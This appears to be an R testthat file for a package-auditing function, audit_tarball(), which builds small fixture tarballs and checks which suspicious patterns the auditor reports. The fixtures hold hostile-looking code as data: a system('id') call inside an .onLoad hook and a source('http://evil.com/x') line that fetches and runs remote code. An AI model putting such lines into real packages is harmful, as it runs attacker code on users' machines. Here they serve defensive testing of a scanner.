# Build a minimal .tar.gz source package containing one R file. The tarball is
# named <pkg_name>_<version>.tar.gz so it follows the R source-package naming
# convention. Returns the tarball path; the caller unlink()s it.
make_test_tarball <- function(r_content, pkg_name = "testpkg", version = "0.1.0") {
  base_dir <- tempfile()
  pkg_dir  <- file.path(base_dir, pkg_name)
  dir.create(file.path(pkg_dir, "R"), recursive = TRUE, showWarnings = FALSE)
  writeLines(c(paste("Package:", pkg_name), paste("Version:", version)),
             file.path(pkg_dir, "DESCRIPTION"))
  writeLines(r_content, file.path(pkg_dir, "R", "zzz.R"))

  out_dir <- tempfile("tb")
  dir.create(out_dir)
  tarball <- file.path(out_dir, sprintf("%s_%s.tar.gz", pkg_name, version))
  old_wd  <- setwd(base_dir)
  on.exit(setwd(old_wd), add = TRUE)
  utils::tar(tarball, files = pkg_name, compression = "gzip", tar = "internal")
  unlink(base_dir, recursive = TRUE)
  tarball
}

# error paths ------------------------------------------------------------------
test_that("audit_tarball() stops if the path does not exist", {
  expect_error(audit_tarball("/no/such/file.tar.gz"), "file.exists")
})

test_that("audit_tarball() stops when no directory matches the package name", {
  # Tarball named foo_0.1.0.tar.gz but containing a directory named 'bar'.
  base_dir <- tempfile()
  dir.create(file.path(base_dir, "bar", "R"), recursive = TRUE)
  writeLines(c("Package: bar", "Version: 0.1.0"),
             file.path(base_dir, "bar", "DESCRIPTION"))
  writeLines("system('id')", file.path(base_dir, "bar", "R", "zzz.R"))

  out_dir <- tempfile("tb"); dir.create(out_dir)
  tarball <- file.path(out_dir, "foo_0.1.0.tar.gz")
  old_wd  <- setwd(base_dir)
  utils::tar(tarball, files = "bar", compression = "gzip", tar = "internal")
  setwd(old_wd)
  on.exit(unlink(c(base_dir, out_dir), recursive = TRUE), add = TRUE)

  expect_error(audit_tarball(tarball), "No directory named 'foo'")
})

test_that("audit_tarball() audits the named package directory and ignores siblings", {
  # foo_0.1.0.tar.gz containing both foo/ (the package) and an unrelated bar/.
  base_dir <- tempfile()
  dir.create(file.path(base_dir, "foo", "R"), recursive = TRUE)
  dir.create(file.path(base_dir, "bar"), recursive = TRUE)
  writeLines(c("Package: foo", "Version: 0.1.0"),
             file.path(base_dir, "foo", "DESCRIPTION"))
  writeLines("system('id')", file.path(base_dir, "foo", "R", "zzz.R"))
  writeLines("source('http://evil.com/x')", file.path(base_dir, "bar", "sneaky.R"))

  out_dir <- tempfile("tb"); dir.create(out_dir)
  tarball <- file.path(out_dir, "foo_0.1.0.tar.gz")
  old_wd  <- setwd(base_dir)
  utils::tar(tarball, files = c("foo", "bar"), compression = "gzip", tar = "internal")
  setwd(old_wd)
  on.exit(unlink(c(base_dir, out_dir), recursive = TRUE), add = TRUE)

  res <- audit_tarball(tarball)
  # The package's own finding is present; nothing from the sibling bar/ dir.
  expect_true("system_pattern" %in% res$patterns$pattern)
  expect_false(any(grepl("bar/", res$patterns$file_context, fixed = TRUE)))
})

# happy path -------------------------------------------------------------------
test_that("audit_tarball() returns the four-frame result and relative paths", {
  tb <- make_test_tarball(".onLoad <- function(libname, pkgname) system('id')")
  on.exit(unlink(tb), add = TRUE)

  res <- audit_tarball(tb)
  expect_s3_class(res, "pkgaudit")
  expect_named(res, c("file_contexts", "code_contexts", "patterns", "errors",
                      "metadata"))

  expect_true("onload_code" %in% res$code_contexts$code_context)
  sys <- res$patterns[res$patterns$pattern == "system_pattern", ]
  expect_equal(nrow(sys), 1L)
  expect_equal(sys$code_context, "onload_code")

  # Paths are relative to the package root, not the extraction temp dir.
  expect_true(all(startsWith(res$patterns$file_context, "R/")))
  expect_false(any(startsWith(res$patterns$file_context, tempdir())))
})

test_that("audit_tarball() handles a package name containing a dot", {
  tb <- make_test_tarball("system('id')", pkg_name = "my.pkg", version = "1.2.3")
  on.exit(unlink(tb), add = TRUE)
  res <- audit_tarball(tb)
  expect_true("system_pattern" %in% res$patterns$pattern)
})

test_that("audit_tarball() returns no patterns for a clean package", {
  tb <- make_test_tarball("my_fn <- function(x) x + 1")
  on.exit(unlink(tb), add = TRUE)

  res <- audit_tarball(tb)
  expect_equal(nrow(res$patterns), 0L)
  expect_equal(nrow(res$errors), 0L)
})
